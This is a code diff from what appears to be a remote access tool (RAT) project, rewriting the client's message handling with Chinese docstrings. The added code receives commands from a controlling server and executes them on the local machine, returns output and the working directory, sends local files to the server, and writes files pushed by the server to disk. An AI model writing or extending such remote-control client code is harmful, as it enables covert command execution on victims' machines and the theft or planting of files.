@@ -1,8 +1,9 @@
 import ntpath
 import os
 
+from client.command import Command, execute_command
 from common.ratsocket import RATSocket
-from common.util import get_read_stream
+from common.util import logger, get_input_stream, get_output_stream
 
 
 class Server(RATSocket):
@@ -10,24 +11,67 @@ class Server(RATSocket):
     def __init__(self):
         super().__init__()
 
-    def send_result(self, status, result, id, eof=1):
-        body = result.encode()
-        head = {
-            'id': id,
+    def send_result(self, id: int, status: int, result: str):
+        """
+        向服务端发送结果
+        :param id: 与命令id对应
+        :param status: 0或1
+        :param result: 结果
+        """
+        data = {
             'type': 'result',
-            'length': len(body),
+            'id': id,
             'status': status,
-            'eof': eof,
+            'text': result,
             'cwd': os.getcwd()
         }
-        self.send(head, bytes=body)
+        self.send(data)
 
-    def send_file(self, filename, id):
-        head = {
-            'id': id,
+    def send_file(self, id: int, filename: str):
+        """
+        向服务端发送文件
+        :param id: 与命令id对应
+        :param filename: 文件名
+        """
+        data = {
             'type': 'file',
+            'id': id,
             'length': os.stat(filename).st_size,
             'filename': ntpath.basename(filename),
             'cwd': os.getcwd(),
         }
-        self.send(head, file_stream=get_read_stream(filename))
+        self.send(data)
+        if self.recv_signal():
+            self.send_io(get_output_stream(filename))
+
+    def recv_command(self) -> (int, int, str):
+        """
+        从服务端接收命令并在本地执行
+        :return: 结果id，状态，结果
+        """
+        data = self.recv()
+        logger.info(data)
+        id = data['id']
+        type = data['type']
+        try:
+            # 如果是命令
+            if type == 'command':
+                Command.server = self
+                Command.id = id
+                return id, *execute_command(data['text'])
+            # 如果是文件
+            elif type == 'file':
+                filename = os.path.abspath(data['filename'])
+                try:
+                    io = get_input_stream(filename)
+                except Exception as e:
+                    self.send_signal(0)
+                    return id, 0, str(e)
+                try:
+                    self.send_signal(1)
+                    self.recv_io(data['length'], io)
+                    return id, 1, f'File uploaded to: {os.path.abspath(filename)}'
+                except Exception as e:
+                    logger.error(f'Error receiving file from server: {e}')
+        except Exception as e:
+            return id, 0, f'{e}\n'
